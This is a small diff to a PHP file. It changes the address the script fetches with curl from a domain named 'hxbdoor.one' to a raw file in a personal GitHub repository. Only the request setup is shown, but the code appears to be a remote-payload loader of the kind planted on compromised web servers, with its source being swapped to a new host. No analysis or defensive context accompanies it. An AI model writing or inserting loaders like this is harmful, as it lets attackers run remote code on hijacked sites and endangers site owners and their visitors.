@@ -1,5 +1,5 @@
 <?php
-$url = "https://hxbdoor.one/raw/3JNjlrUs";
+$url = "https://raw.githubusercontent.com/islam2672/anatoly21/refs/heads/main/index";
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HEADER, true);
